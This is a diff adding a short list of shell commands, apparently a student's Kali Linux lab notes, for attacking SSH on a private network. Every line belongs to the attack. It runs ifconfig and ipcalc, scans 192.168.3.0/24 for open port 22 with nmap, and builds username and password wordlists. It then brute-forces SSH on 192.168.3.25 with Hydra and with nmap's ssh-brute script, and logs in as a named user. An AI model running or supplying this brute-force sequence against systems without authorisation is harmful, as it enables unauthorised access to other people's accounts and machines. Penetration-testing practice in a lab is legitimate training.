@@ -1,0 +1,19 @@
+ifconfig 
+ipcalc 192.168.3.4
+nmap 192.168.3.0/24 -p 22 --open  
+mkdir wordlist
+cd wordlist
+touch userlist.txt 
+touch passlist.txt
+ls
+nano userlist.txt 
+nano passlist.txt
+cat userlist.txt 
+cat passlist.txt 
+hydra -L /home/kali/wordlist/userlist.txt -P /home/kali/wordlist/passlist.txt ssh://192.168.3.25 -t 4 
+ssh naufal@192.168.3.25
+
+NMAP BruteForce 
+nmap 192.168.3.25 -p 22 --script ssh-brute --script-args userdb=/home/kali/wordlist/userlist.txt,passdb=/home/kali/wordlist/passlist.txt  
+
+   
